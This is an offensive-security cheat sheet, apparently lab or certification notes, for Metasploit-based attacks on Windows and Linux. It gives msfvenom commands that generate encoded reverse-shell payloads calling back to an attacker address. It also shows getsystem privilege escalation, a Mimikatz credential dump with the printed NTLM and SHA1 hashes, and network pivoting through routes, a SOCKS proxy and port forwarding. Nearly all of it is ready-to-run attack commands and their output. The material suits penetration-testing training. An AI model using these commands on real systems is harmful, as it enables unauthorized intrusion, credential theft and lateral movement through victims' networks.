https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/
##### Standard usage
`msfvenom -a ARCH -p PAYLOAD -e ENCODER -f FORMAT -o OUTPUT LHOST=IP LPORT=PORT`

##### Important formats
Windows: `dll, exe, exe-service, powershell, msi` (NOTE: make sure to use the correct amount of bits, `64` or `32`, or shells won')
Linux: `elf, bash`
Misc: `python, ruby `

##### Useful encoders
Windows: `x86/shikata_ga_nai, x86/opt_sub`

###### Important payloads
Windows: ``
Linux: 

```
msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.8.16.7 LPORT=4444 // Generate a staged ELF meterpreter reverse shell
```
##### Windows
```
msfvenom -a ARCH -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -f EXE -o winshell.exe LHOST=IP LPORT=PORT
msfvenom -p windows/x64/shell_reverse_tcp -f dll -o winshell.dll LHOST=IP LPORT=PORT
```

##### Staged vs stageless
Staged payloads: Small bit of code that connects to the attacker, then downloads an actual payload to the RAM.
Example: `windows/shell/reverse_tcp`

Stageless payloads: Full payload, connects to listener when executed.
Example: `windows/shell_reverse_tcp

##### MSFConsole:
```
set payload METERPRETER_PAYLOAD  // meterpreter/ payloads
set LHOST 0.0.0.0
set LPORT 4444
run -j  // Run in background
```

### Post-exploitation

Getting system privileges
```
getuid
```
###### Example
```
(Meterpreter 5)(C:\Users\luiza) > getuid
Server username: ITWK01\luiza
(Meterpreter 5)(C:\Users\luiza) > getsystem
[-] Already running as SYSTEM
(Meterpreter 5)(C:\Users\luiza) > getuid
Server username: NT AUTHORITY\SYSTEM
(Meterpreter 5)(C:\Users\luiza) > 

```


Loading Mimikatz and obtaining hashes:
```
load kiwi
creds_msv
```
###### Example
```
(Meterpreter 6)(C:\Users\luiza) > load kiwi        
Loading extension kiwi...                  
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)  
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
    
Success.
(Meterpreter 6)(C:\Users\luiza) > creds_msv  
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

Username  Domain  NTLM                              SHA1
--------  ------  ----                              ----
luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a0d837
offsec    ITWK01  1c3fb240ae45a2dc5951a043cf47040e  a914116eb78bec73deb3819546426c2f6bd80bbd

```


#### Pivoting
Scanning other IPs
```
ipconfig
// Check the internal IP (Ethernet adapter IPv4 Address)

// If in a Meterpreter session 
background

// Use the IP from the previous step, replacing the last octet with a 0. This will enable Metasploit to use the IP as a target, and the sessoin to target it to.
route add INTERNAL_IP /24 SESSION_ID
// To check
route print

use auxiliary/scanner/portscan/tcp
set RHOSTS TARGET_INTERNAL_IP_ADDRESS
set PORTS TARGET_PORTS                 // Suggester: 445, 3389. If the SMB ports are open, use exploit/windows/smb/psexec with the known credentials.
run
```

First, make sure that the `/etc/proxychains.conf` port is set to `1080`.

```
// If in a Meterpreter session:
background

// Setting up the proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
run -j

// Regular commands can now be ran
proxychains xfreerdp /v:

```

##### Port forwarding in a Meterpreter session

Portfwd will create a local TCP relay of a remote port.
```
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.
```

```
sessions -i SESSION_TO_ENTER
portfwd -h


portfwd add -l 3389 -p 3389 -r 172.16.5.200

xfreerdp /v:127.0.0.1 /u:USER
```

